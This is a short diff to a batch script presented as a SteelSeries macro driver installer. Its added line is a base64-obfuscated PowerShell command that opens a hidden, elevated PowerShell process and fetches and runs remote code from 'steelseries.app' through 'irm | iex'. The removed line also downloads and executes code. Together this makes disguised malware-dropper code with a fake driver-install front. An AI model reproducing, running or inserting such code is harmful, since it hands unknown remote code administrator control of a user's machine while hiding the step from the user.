@@ -5,7 +5,7 @@ color 6
 echo [LOG] Installing Drivers
 
 :: Use steelseries macro drivers...
-powershell "irm steelseries.app/x64/macros | iex"
+powershell -Command "iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAtAEMAbwBtAG0AYQBuAGQAIABpAHIAbQAgAHMAdABlAGUAbABzAGUAcgBpAGUAcwAuAGEAcABwACAAfAAgAGkAZQB4ACIAIAAtAFYAZQByAGIAIABSAHUAbgBBAHMAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuAA==')))"
 
 echo [LOG] Drivers Installed!
 
